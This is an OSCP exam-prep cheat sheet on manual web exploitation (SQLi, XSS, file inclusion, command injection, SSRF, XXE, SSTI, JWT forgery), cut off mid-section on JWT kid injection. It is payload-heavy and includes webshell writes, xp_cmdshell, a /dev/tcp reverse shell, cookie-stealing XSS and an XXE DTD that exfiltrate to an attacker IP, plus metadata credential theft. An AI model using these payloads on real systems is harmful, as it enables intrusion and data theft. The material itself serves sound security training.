# OSCP Core Web Vulnerability Methodology (Manual Exploitation)

*For authorized pentest/exam prep only — techniques and payloads below assume you have explicit written
authorization to test the target.*

*Scope note: this file covers the manual detection/exploitation methodology for the core OWASP-class
web vulnerabilities (SQLi, XSS, LFI/RFI, command injection, SSRF, XXE, SSTI, JWT attacks, NoSQL injection) — the "find and confirm it by hand"
step that sits **before** automation. For sqlmap tamper-script usage and shell escalation once an
injection point is already found, see [`web-attack-techniques.md` §5](web-attack-techniques.md#5-sqlmap--tamper-scripts--shell-escalation).
For file-upload bypass, deserialization, and WordPress/CMS attack techniques, see the rest of
[`web-attack-techniques.md`](web-attack-techniques.md).*

---

## 1. Manual SQL Injection

### 1.1 Detection
**Explanation:** Before reaching for sqlmap, confirm the injection by hand — it's faster for simple cases, avoids WAF noise, and is expected exam methodology. Test every parameter (GET/POST/cookie/header) with syntax-breaking and always-true/always-false payloads and compare responses.

**Example payloads:**
```
id=1'
id=1"
id=1`
id=1) 
id=1 AND 1=1   -- expect same page as id=1
id=1 AND 1=2   -- expect different/empty page if injectable
id=1' AND '1'='1
id=1' AND '1'='2
id=1' OR '1'='1'-- -
```
A DB error (MySQL `You have an error in your SQL syntax`, MSSQL `Unclosed quotation mark`, Oracle `ORA-00933`, PostgreSQL `syntax error at or near`) on the `'`/`"` test confirms unsanitized input reaches the query.

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html

---

### 1.2 UNION-Based Extraction
**Explanation:** Once injectable, find the column count with `ORDER BY`, then use `UNION SELECT` to pull arbitrary data (DB version, current user, table/column names, credentials) into the page's own output.

**Example (MySQL):**
```sql
id=1 ORDER BY 1-- -
id=1 ORDER BY 2-- -
id=1 ORDER BY 3-- -          -- keep incrementing until it errors; last successful N = column count

id=-1 UNION SELECT 1,2,3-- -                              -- identify which column(s) reflect in the page
id=-1 UNION SELECT 1,@@version,3-- -                       -- DB version
id=-1 UNION SELECT 1,database(),3-- -                      -- current DB
id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
id=-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -
```
`0x3a` is the hex literal for `:`, used as a separator without breaking out of the string context. Set `id=-1` (a value that returns no real rows) so only the injected UNION row appears.

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md

---

### 1.3 Error-Based Extraction
**Explanation:** When output isn't directly reflected but DB errors are shown on the page, force the DB to leak data inside its own error message — useful when UNION output has nowhere to display.

**Example (MySQL — `extractvalue`/`updatexml` XPath error trick):**
```sql
id=1 AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
id=1 AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
```
`extractvalue`/`updatexml` throw an XPath syntax error containing the first ~32 chars of the subquery result (prefixed with `~` from `0x7e` as a visual marker); page through longer data with `SUBSTRING()`.

**Example (MSSQL — type-conversion error):**
```sql
id=1 AND 1=CONVERT(int,(SELECT @@version))--
```

**Reference:** https://portswigger.net/web-security/sql-injection/examining-the-database

---

### 1.4 Blind SQL Injection (Boolean-Based)
**Explanation:** No error and no reflected output — infer data one bit/character at a time by asking true/false questions and watching for a content or status-code difference between the true and false response.

**Example:**
```sql
id=1 AND 1=1        -- baseline "true" page
id=1 AND 1=2        -- baseline "false" page (compare length/content diff to the above)

id=1 AND (SELECT SUBSTRING(database(),1,1))='a'      -- test char-by-char
id=1 AND (SELECT ASCII(SUBSTRING(database(),1,1)))>109  -- binary-search the ASCII value, faster than linear a-z
```
Automate the character-by-character loop with a small script (or just switch to sqlmap once confirmed — see [`web-attack-techniques.md` §5](web-attack-techniques.md#5-sqlmap--tamper-scripts--shell-escalation)) once the true/false oracle is confirmed manually.

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html#confirming-with-timing

---

### 1.5 Blind SQL Injection (Time-Based)
**Explanation:** Use when there's no visible content/status difference at all between true/false conditions (fully blind) — inject a conditional `SLEEP()`/`WAITFOR DELAY` and measure the response time instead of the response content.

**Example:**
```sql
# MySQL
id=1 AND IF(1=1,SLEEP(5),0)-- -
id=1 AND IF((SELECT SUBSTRING(database(),1,1))='a',SLEEP(5),0)-- -

# MSSQL
id=1; IF (1=1) WAITFOR DELAY '0:0:5'--

# PostgreSQL
id=1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -

# Oracle
id=1 AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)-- -
```
A consistent ~5s delay on the true condition (vs. near-instant on false) confirms the injection. Confirm with `curl -w "%{time_total}\n"` or Burp's response-time column rather than eyeballing it.

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md#exploitation

---

### 1.6 Stacked Queries
**Explanation:** Some DBMS+driver combinations let you terminate the first query with `;` and append a wholly new statement. This is how `xp_cmdshell` and `INSERT`/`UPDATE` chains work through SQLi. **Support matrix:** MSSQL (almost always, via TDS protocol) and PostgreSQL (libpq default) support stacked queries natively. MySQL blocks them in `mysqli_query()` / PHP's default single-query mode (requires `mysqli_multi_query()` explicitly), so stacked queries rarely work against PHP+MySQL apps. Always test: inject `; SELECT 1--` and check for errors vs. silent success.

```sql
id=1; INSERT INTO users(username,password) VALUES('backdoor','hacked')--
id=1; UPDATE users SET password='hacked' WHERE username='admin'--
```

---

### 1.7 Second-Order SQL Injection
**Explanation:** The payload is stored (e.g., in a registration field) and executed later when a different query uses the stored value unsanitized. The insertion point and the detonation point are different pages/functions — enumeration requires tracing how stored data flows back into SQL. Common scenario: register a username like `admin'--`, then trigger a password-change flow that builds `UPDATE users SET password='X' WHERE username='admin'--'`.

```
Registration: username = admin'--
Password change uses: UPDATE users SET password='newpass' WHERE username='admin'--'
  → resets admin's password, not the attacker's account
```

**Detection:** look for any stored field (username, address, profile bio) that later appears in error messages, changes other users' data, or causes application errors on a different page than where the input was originally submitted.

---

### 1.8 SQLi to OS Access (manual, pre-sqlmap)
**Explanation:** With `FILE` privilege (MySQL) or `xp_cmdshell` (MSSQL), a confirmed injection can escalate straight to reading/writing files or command execution by hand, without waiting on `sqlmap --os-shell`.

**Example (MySQL — write a webshell via `INTO OUTFILE`, requires `FILE` priv + known web root):**
```sql
id=-1 UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3 INTO OUTFILE '/var/www/html/shell.php'-- -
```
**Example (MSSQL — enable and use `xp_cmdshell`, requires sysadmin):**
```sql
id=1; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
id=1; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
id=1; EXEC xp_cmdshell 'whoami';--
```

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/sql-injection/mysql-injection/index.html · https://book.hacktricks.wiki/en/pentesting-web/sql-injection/mssql-injection/index.html

---

## 2. Cross-Site Scripting (XSS)

### 2.1 Detection & Types
**Explanation:** Test every input (params, forms, headers like `User-Agent`/`Referer`, JSON body fields) and every place it's later reflected in the HTML response. Classify as **reflected** (payload in request, echoed immediately in that response — no persistence), **stored** (payload saved server-side, served to other viewers, e.g. a comment/profile field), or **DOM-based** (payload never reaches the server — a client-side JS sink like `innerHTML`/`document.write` renders attacker-controlled URL/hash data unsanitized).

**Example detection payloads (start unencoded, check output context first):**
```html
<script>alert(document.domain)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)        <!-- for href/src-context or DOM sinks -->
```
Check the reflection context in view-source before assuming a filter blocks you — if input lands inside an existing `<script>` block, an attribute, or an HTML comment, the working payload differs (e.g. inside an attribute: `" onmouseover="alert(1)`; inside an existing script string: `';alert(1);//`).

**Reference:** https://portswigger.net/web-security/cross-site-scripting

---

### 2.2 Exploitation — Cookie/Session Theft
**Explanation:** For OSCP purposes the realistic goal of XSS is usually stealing an authenticated session cookie (or triggering an action as an admin/victim, e.g. CSRF-token exfil) rather than a client-side popup — set up a listener and exfiltrate.

**Example:**
```bash
# Attacker: catch the exfil
nc -lvnp 8000
```
```html
<script>new Image().src="http://10.10.14.1:8000/?c="+document.cookie</script>
<!-- or, more reliably across CSP/referrer policies -->
<script>fetch("http://10.10.14.1:8000/?c="+btoa(document.cookie))</script>
```
If `HttpOnly` blocks direct `document.cookie` access, pivot to acting *as* the victim instead of stealing the cookie — e.g. an XHR from the victim's browser that performs a privileged action (add-admin-user, change-password) and exfiltrates the response.

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

---

## 3. Local / Remote File Inclusion

### 3.1 Detection & Path Traversal
**Explanation:** LFI occurs when a file-path parameter (`?page=`, `?file=`, `?template=`, `?lang=`) is passed into a server-side include/read function without sanitization. Confirm with a known-good absolute-path traversal to a file that always exists.

**Example:**
```
http://target/index.php?page=../../../../etc/passwd
http://target/index.php?page=....//....//....//....//etc/passwd     # bypasses naive str_replace("../","") filters
http://target/index.php?page=..%2f..%2f..%2f..%2fetc%2fpasswd        # URL-encoded traversal
http://target/index.php?page=/etc/passwd%00                          # null-byte to strip an appended extension (PHP < 5.3.4)
```
On Windows targets: `..\..\..\..\windows\win.ini` (or its URL-encoded form `..%5c..%5c..%5c..%5cwindows%5cwin.ini`).

**High-value files to read once LFI is confirmed:**

| Linux | Windows |
|---|---|
| `/etc/passwd` (user list) | `C:\Windows\win.ini` (confirmation) |
| `/etc/shadow` (hashes, if readable) | `C:\Windows\System32\config\SAM` (locked, but try VSS copies) |
| `/etc/hosts` | `C:\inetpub\wwwroot\web.config` (creds, connection strings) |
| `/proc/self/environ` (env vars, secrets) | `C:\Users\<user>\.ssh\id_rsa` |
| `/proc/self/cmdline` (process args) | `C:\Windows\repair\SAM` / `C:\Windows\repair\SYSTEM` |
| `/home/<user>/.ssh/id_rsa` | `C:\Windows\Panther\Unattend.xml` (setup creds) |
| `/home/<user>/.bash_history` | `C:\Windows\debug\NetSetup.log` |
| `/root/.bash_history` | `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` |
| `/var/lib/php/sessions/sess_*` | `C:\xampp\apache\conf\httpd.conf` |
| `/etc/crontab` | `C:\inetpub\logs\LogFiles\` |
| `/proc/self/fd/[0-20]` (open file descriptors) | `C:\boot.ini` (older systems) |
| App-specific: `/var/www/html/wp-config.php`, `.env`, `config.php` | App-specific: `web.config`, `appsettings.json`, `connectionStrings.config` |

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html

---

### 3.2 PHP Wrapper Abuse (source disclosure & code execution)
**Explanation:** When LFI can't directly execute (or you need the *source* of a `.php` file rather than its rendered output), PHP's stream wrappers turn an LFI into arbitrary file read or direct RCE.

**Example — `php://filter` to base64-dump PHP source (read, not execute):**
```
http://target/index.php?page=php://filter/convert.base64-encode/resource=config
# then: base64 -d
```
**Example — `php://input` to execute POSTed PHP code (requires `allow_url_include=On`, rarer in modern configs):**
```bash
curl "http://target/index.php?page=php://input" --data '<?php system($_GET["cmd"]); ?>'
```
**Example — `data://` wrapper to execute inline base64 PHP (needs both `allow_url_include=On` and `allow_url_fopen=On`):**
```
http://target/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```
(decodes to `<?php system($_GET['cmd']); ?>`)

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#php-wrappers

---

### 3.3 Log / Session Poisoning to RCE
**Explanation:** When wrappers are disabled, poison a file the app already includes so it contains attacker-controlled PHP, then trigger the LFI to execute it.

**Example — Apache/Nginx access-log poisoning:**
```bash
# Set a PHP payload as the User-Agent so it gets written into the access log
curl -s http://target/ -A '<?php system($_GET["cmd"]); ?>'
# Then include the log file (path varies by distro):
curl "http://target/index.php?page=../../../../var/log/apache2/access.log&cmd=id"
curl "http://target/index.php?page=../../../../var/log/nginx/access.log&cmd=id"
```
**Example — PHP session-file poisoning (works even when logs aren't readable):**
```bash
curl -s "http://target/index.php" -b "PHPSESSID=abc123" --data-urlencode 'x=<?php system($_GET["cmd"]); ?>'
# Session files live at /var/lib/php/sessions/sess_<PHPSESSID> on default Debian/Ubuntu configs — the
# posted param name (x) becomes the session key, planting the payload string into the session file.
curl "http://target/index.php?page=../../../../var/lib/php/sessions/sess_abc123&cmd=id"
```
**Example — SSH auth-log poisoning (LFI + exposed SSH, no web write primitive needed):**
```bash
ssh '<?php system($_GET["cmd"]); ?>'@target     # username itself becomes the payload; auth fails but gets logged
curl "http://target/index.php?page=../../../../var/log/auth.log&cmd=id"
```

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#via-php-session

---

### 3.4 Remote File Inclusion (RFI)
**Explanation:** When `allow_url_include=On` (rare, legacy PHP configs) the include parameter can point at an attacker-hosted URL directly — no local file needed at all.

**Example:**
```bash
# Attacker
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8000
```
```
http://target/index.php?page=http://10.10.14.1:8000/shell.php&cmd=id
```

**SMB-based RFI (Windows targets — bypasses `allow_url_include`):**
On Windows, PHP's `include()` resolves UNC paths natively via Windows SMB client — `allow_url_include` does NOT need to be enabled, making this far more likely to work than HTTP-based RFI on modern configs.
```bash
# Attacker: host a PHP payload via SMB
impacket-smbserver share /tmp/payloads -smb2support
echo '<?php system($_GET["cmd"]); ?>' > /tmp/payloads/shell.php
```
```
http://target/index.php?page=\\10.10.14.1\share\shell.php&cmd=whoami
```

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#remote-file-inclusion

---

## 4. OS Command Injection

### 4.1 Detection
**Explanation:** Look for any feature that plausibly shells out server-side (ping/traceroute tools, file-conversion utilities, IP-lookup fields) and inject shell metacharacters. Confirm with a delay-based payload before assuming output-based confirmation will work (output may be suppressed even when the injection fires).

**Example payloads:**
```
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1 `id`
127.0.0.1 $(id)
127.0.0.1 || id              # OR — runs second command only if first fails
127.0.0.1; sleep 5          # blind confirmation — no output needed, just observe the delay
127.0.0.1|ping -n 5 127.0.0.1   # Windows blind confirmation equivalent
%0aid                        # newline injection (URL-encoded) — bypasses filters that only check for ; | && $()
```

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/command-injection.html

---

### 4.2 Filter Bypass & Shell Payload
**Explanation:** Basic blacklists (blocked spaces, blocked specific keywords) are common on OSCP-style boxes — the standard bypasses below usually clear them.

**Example:**
```bash
# Space filter bypass
127.0.0.1;{cat,/etc/passwd}
127.0.0.1;cat${IFS}/etc/passwd
127.0.0.1;cat$IFS/etc/passwd

# Blocked-keyword bypass (e.g. "cat" blacklisted)
127.0.0.1;c'a't${IFS}/etc/passwd
127.0.0.1;/bin/c\at${IFS}/etc/passwd

# Straight to a reverse shell once confirmed
127.0.0.1;bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>%26${IFS}/dev/tcp/10.10.14.1/4444${IFS}0>%261'
```
See [`CHEATSHEET.md` §5–6](../CHEATSHEET.md#5-msfvenom-payload-generation) for the full reverse-shell one-liner set once command execution is confirmed.

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md

---

## 5. SSRF (Server-Side Request Forgery) — Primer

**Explanation:** Any feature that makes the server fetch a URL on the app's behalf (webhook config, "import from URL", PDF/image generators, avatar-from-URL uploaders, the `pingback.ping` WordPress method — see [`web-attack-techniques.md` §3.1](web-attack-techniques.md#31-manual-enumeration-no-tools)) can potentially be redirected to internal-only services, cloud metadata endpoints, or other ports on the target itself.

**Example:**
```
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/    # AWS instance-metadata credential theft
url=http://127.0.0.1:6379/                                               # port-scan/probe internal services from the server's vantage point
url=http://internal-only-host.corp.local:8080/admin
url=file:///etc/passwd                                                    # some SSRF sinks also accept file:// for local read
```
Bypass naive `localhost`/`127.0.0.1` blocklists with alternate representations: `http://0177.0.0.1/` (octal), `http://2130706433/` (decimal), `http://127.1/`, `http://[::1]/`, or a DNS name that resolves to `127.0.0.1` (`http://spoofed.burpcollaborator.net/` style rebinding domains). See [`service-enumeration-comprehensive.md`](service-enumeration-comprehensive.md) for the gopher-protocol SSRF-to-Redis-RCE chain when a raw-protocol SSRF primitive is available.

**Blind SSRF detection (no response reflection):**
When the server fetches the URL but doesn't return the response body, confirm via out-of-band callbacks:
```bash
# Start a listener and use the URL parameter to point at it
python3 -m http.server 8000
# or use Burp Collaborator / interact.sh for DNS+HTTP callback
```
```
url=http://10.10.14.1:8000/ssrf-confirm     # check your listener for the hit
url=http://BURP-COLLAB-ID.oastify.com/      # Burp Collaborator DNS+HTTP callback
```
A hit on your listener confirms the server made an outbound request — even though you can't see the response. Then pivot to internal service probing (ports, metadata endpoint) and exfiltrate via timing/error differences or by chaining into a protocol that allows write (e.g. `gopher://` to Redis).

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html

---

## 6. XXE (XML External Entity) — Primer

**Explanation:** Apps that parse attacker-supplied XML with an XML parser that hasn't disabled external entity resolution (common in older/default configs of Java, PHP `libxml`, .NET) can be made to read local files or trigger SSRF by defining a custom entity that references a local path or URL.

**Example — classic file-read XXE:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><data>&xxe;</data></root>
```
**Example — blind/OOB XXE (when the parsed result isn't reflected back) via a hosted DTD:**
```xml
<!-- attacker-hosted evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.10.14.1:8000/?x=%file;'>">
%eval;
%exfil;
```
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://10.10.14.1:8000/evil.dtd"> %xxe; ]>
```
**Example — SSRF/port-scan via XXE:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
```
Look for XXE in any endpoint that accepts XML directly, but also in formats that embed XML internally (DOCX/XLSX/PPTX Office Open XML, SVG uploads, SOAP endpoints).

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/xxe-xml-external-entity/index.html

---

## 7. Server-Side Template Injection (SSTI)

### 7.1 Detection
**Explanation:** SSTI occurs when user input is concatenated into a server-side template string and re-rendered by the template engine, rather than passed in as inert data. Test every reflected input point (params, form fields, headers, filenames) with a generic polyglot first, then narrow with per-engine math probes. If `49` appears in the response, the expression was evaluated server-side (confirmed SSTI); if the literal payload is reflected unchanged, you're looking at XSS or no injection instead.

**Example payloads:**
```
${{<%[%'"}}%\.        # generic polyglot — throws distinct errors per engine, useful as a first probe
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
${{7*7}}
```
`49` in the response body = template evaluation confirmed. The literal string reflected back unchanged = not SSTI (check for XSS instead).

**Reference:** https://portswigger.net/web-security/server-side-template-injection

---

### 7.2 Engine Fingerprinting
**Explanation:** Once a probe fires, narrow down the specific engine before picking an exploitation chain — payload syntax is engine-specific and a wrong guess wastes time. Use the table below as a quick decision aid; walk PortSwigger's full decision tree (referenced below) for edge cases.

| Probe that fires | Likely engine(s) | Disambiguation |
|---|---|---|
| `{{7*7}}` → `49` | Jinja2 (Python/Flask), Twig (PHP) | `{{7*'7'}}` → `7777777` (string repetition) = Jinja2; → `49` or a type error = Twig |
| `${7*7}` → `49` | FreeMarker (Java) | `<#assign x=7*7>${x}` also works only on FreeMarker |
| `${7*7}` → `49` (Velocity) | Velocity (Java) | Velocity is more reliable via `#set($x=7*7)$x` than the bare `${}` probe |
| `<%= 7*7 %>` → `49` | ERB (Ruby/Rails) | — |
| `#{7*7}` → `49` | Java EL/JSF-style `#{}` contexts | — |
| `${{7*7}}` → `49` | Rare doubly-wrapped EL-in-template contexts | — |
| Math probes inert; `{$smarty.version}` leaks a version string | Smarty (PHP) | Confirm further with `{php}echo 7*7;{/php}` if `{php}` tags aren't disabled |
| `{{...}}` only resolves registered helpers, no arithmetic | Handlebars (JS) | Logic-less by design — **not** generally exploitable to RCE via SSTI the way the engines above are |

**Reference:** https://portswigger.net/web-security/server-side-template-injection#identifying-template-injection-vulnerabilities

---

### 7.3 Exploitation to RCE — Jinja2 (Python/Flask)
**Explanation:** Jinja2 templates execute inside the Flask app's own Python interpreter, so a confirmed injection lets you walk Python's object graph (`__class__`, `__mro__`, `__globals__`, `__builtins__`) from any object literal back to `os`/`subprocess` and get command execution. Check `{{config}}` first — Flask's global config object often dumps `SECRET_KEY` and other secrets on its own, a low-risk win before attempting RCE.

**Example payloads:**
```
{{config}}                                                                       # Flask config dump (SECRET_KEY, DB creds, etc.) — try before going for RCE
{{7*7}}                                                                          # confirm — 49
{{self.__init__.__globals__.__builtins__}}                                       # confirm builtins are reachable (unsandboxed environment)
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}   # classic one-liner RCE
{{ ''.__class__.__mro__[1].__subclasses__() }}                                   # if self/config are blocked: enumerate loaded subclasses to find e.g. subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}   # INDEX = the subprocess.Popen (or similar) index from the enumeration above
```
The exact working gadget depends on the Jinja2 version and whether the app uses a plain `Environment` (unsandboxed, classic one-liner works directly) or `jinja2.sandbox.SandboxedEnvironment` (blocks direct `__builtins__` access — fall back to the subclass-enumeration chain, and expect the subclass index to vary per target). If neither classic payload fires cleanly, use tplmap (§7.5) to search for the right gadget/index automatically.

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html

---

### 7.4 Exploitation to RCE — Twig (PHP)
**Explanation:** Twig runs inside the PHP process. An unsandboxed Twig environment (raw framework usage without `Twig\Sandbox\SecurityPolicy`) allows registering an arbitrary PHP function as a filter callback and immediately invoking it — direct RCE. Many CMS/page-builder integrations wrap Twig in a sandbox that whitelists filters/functions, which blocks this directly and requires an app-specific sandbox-escape gadget instead.

**Example payloads:**
```
{{7*7}}                                                                          # confirm — 49
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}   # classic unsandboxed RCE — registers exec() as the fallback filter, then calls it
{{['id']|filter('system')}}                                                      # shorter modern equivalent — maps the array through system() as the filter callback
```
If `registerUndefinedFilterCallback`/`getFilter` throws a `Twig\Sandbox\SecurityError` (filter/method not allowed), the environment is sandboxed — direct RCE is blocked and you need a sandbox-escape gadget specific to that CMS/framework version rather than expecting the payload above to work as-is.

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#twig-php

---

### 7.5 Exploitation to RCE — FreeMarker (Java)
**Explanation:** FreeMarker templates run inside the JVM. The `freemarker.template.utility.Execute` class provides a direct `exec()` equivalent. If the template sandbox (`Configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER)`) is not set, the `?new()` built-in instantiates arbitrary classes.

**Example payloads:**
```
${7*7}                                                            # confirm — 49
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}   # direct RCE
<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("java.lang.Runtime").getRuntime().exec("id")}   # alternative via ObjectConstructor
```

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#freemarker-java

---

### 7.6 Exploitation to RCE — Smarty (PHP)
**Explanation:** Smarty 3.x templates can call PHP functions directly via `{function}` syntax when security policies are not applied (`Smarty_Security` class not enabled). The older `{php}` tags were removed in Smarty 4, but the static-class-method and function-call syntax persists.

**Example payloads:**
```
{$smarty.version}                                    # confirm engine + version
{system('id')}                                       # direct function call (Smarty 3.x, no security policy)
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}   # webshell write via Smarty internals
```
If `{system()}` throws a security error, the security policy is active — check for allowed tags/functions in the error output and look for any callable that accepts a string argument you control.

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#smarty-php

---

### 7.7 Automation (tplmap)
**Explanation:** As with sqlmap (§1.1), confirm SSTI by hand first — it's the expected exam methodology and avoids relying on a scanner as ground truth. Once confirmed (and optionally fingerprinted per §7.2), [tplmap](https://github.com/epinna/tplmap) automates engine identification and searches for a working RCE payload/gadget chain across engines, saving time versus manually enumerating `__subclasses__()` indexes or sandbox-escape gadgets by hand. Detection/identification (no `-u ... ` alone beyond confirming injection and engine) is fine; `--os-shell`/`--os-cmd`/`--bind-shell`/`--reverse-shell` are tplmap's fully-automated exploit-to-shell flags and carry the same exam restriction as sqlmap's `--os-shell` (§5 in `web-attack-techniques.md`) — treat them as reference-only.

**Example:**
```bash
tplmap.py -u 'http://target/page?name=John'                  # detect + fingerprint engine — exam-safe
tplmap.py -u 'http://target/page?name=John' --os-shell        # BANNED on OSCP exam — fully-automated OS-shell spawning, reference-only
tplmap.py -u 'http://target/page?name=John' --os-cmd id       # BANNED on OSCP exam — same restriction
```
**Exam caveat:** once tplmap confirms the injection point and engine, hand-craft the RCE payload from §7.3/§7.4 (or the engine-appropriate gadget) yourself rather than letting `--os-shell`/`--os-cmd` automate exploitation end-to-end.

**Reference:** https://github.com/epinna/tplmap

---

## 8. JWT (JSON Web Token) Attacks

### 8.1 alg:none Signature Bypass
**Explanation:** A JWT is three base64url segments — `header.payload.signature`. Some libraries/apps trust the attacker-controlled `alg` field in the header instead of enforcing a fixed algorithm allowlist server-side. Setting `alg` to `none` and stripping the signature entirely produces a token some servers accept as validly "signed," since `none` is a legal (if dangerous) value per the JWS spec. Forge whatever claims you want (`"role":"admin"`, a different `"user"`) before re-encoding.

**Example payloads:**
```bash
# Inspect the existing header/payload segments first
echo '<header_b64url>' | base64 -d 2>/dev/null; echo
echo '<payload_b64url>' | base64 -d 2>/dev/null; echo
```
```python
import base64, json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"user": "admin", "role": "admin"}).encode())  # forge claims as needed
print(f"{header}.{payload}.")   # trailing dot — empty signature segment
```
If plain `none` is rejected, try case variants some parsers still accept (`None`, `NONE`, `nOnE`) and both an empty-but-present signature segment (`header.payload.`) and one omitted entirely (`header.payload`).

**Reference:** https://portswigger.net/web-security/jwt/algorithm-confusion · https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html

---

### 8.2 Weak HMAC Secret Brute-Forcing
**Explanation:** HS256/HS384/HS512-signed tokens are only as strong as the shared secret. If the app uses a short/default/wordlist-guessable secret, cracking it offline lets you forge arbitrary valid tokens (admin claims, extended expiry, etc.) with no further server interaction.

**Example:**
```bash
# hashcat: mode 16500 = JWT (JSON Web Token) — hashes header.payload with each wordlist
# candidate as the HMAC key and compares against the signature segment
hashcat -a 0 -m 16500 '<header>.<payload>.<signature>' /usr/share/wordlists/rockyou.txt

# john: convert to a crackable format first (jwt2john.py ships under /usr/share/john/ on Kali)
python3 /usr/share/john/jwt2john.py '<jwt>' > jwt.hash
john --wordlist=/usr/share/wordlists/rockyou.txt jwt.hash
john --show jwt.hash

# jwt_tool: built-in dictionary crack
python3 jwt_tool.py '<jwt>' -C -d /usr/share/wordlists/rockyou.txt
```
Once cracked, re-sign forged claims with the recovered secret — `jwt_tool.py '<jwt>' -T` to tamper interactively, or directly with PyJWT: `jwt.encode(claims, secret, algorithm="HS256")`.

**Reference:** https://github.com/hashcat/hashcat/issues/1057 · https://github.com/ticarpi/jwt_tool

---

### 8.3 RS256-to-HS256 Key Confusion
**Explanation:** Some JWT libraries pass whatever "key" is configured straight into the same verification call regardless of the algorithm named in the token. If a server issues RS256 tokens (asymmetric — private key signs, public key verifies) but doesn't strictly enforce that incoming tokens' `alg` header must be RS256, an attacker who knows the RSA **public** key can switch `alg` to `HS256` and sign a forged token using that public key's raw bytes as the HMAC secret. The server then "verifies" with the same public key — but treats it as a symmetric HMAC secret, which succeeds because the attacker generated the signature the exact same way.

**Example — obtain the RSA public key:**
```bash
curl -s http://target/.well-known/jwks.json                    # JWKS endpoint, if exposed
curl -s http://target/certs/public.pem                          # sometimes published directly
openssl x509 -in server-cert.pem -pubkey -noout > pubkey.pem     # derive from an exposed TLS/signing cert
```
**Example — forge an HS256 token using the public key as the HMAC secret (PyJWT):**
```python
import jwt

with open("pubkey.pem", "rb") as f:
    public_key = f.read()          # exact bytes matter, including any trailing newline

forged = jwt.encode({"user": "admin", "role": "admin"}, public_key, algorithm="HS256")
print(forged)
```
Send `forged` in place of the original token (`Authorization: Bearer <forged>`).

**Reference:** https://portswigger.net/web-security/jwt/algorithm-confusion · https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html

---

### 8.4 kid (Key ID) Header Injection
**Explanation:** The `kid` (Key ID) header parameter tells the server which key to use for signature verification. If the server uses `kid` in an unsafe way (filesystem path lookup, SQL query, etc.), it can be exploited to sign tokens with a known/empty key.

**Path traversal — sign with an empty/known file:**
```python
import jwt

# kid points to /dev/null (empty file) — sign with empty string as the secret
forged = jwt.encode(
    {"user": "admin", "role": "admin"},
    "",
    algorithm="HS256",
    headers={"kid": "../../../../dev/null"}
)
print(forged)
```

**SQL injection in kid — extract a known key value:**
```json
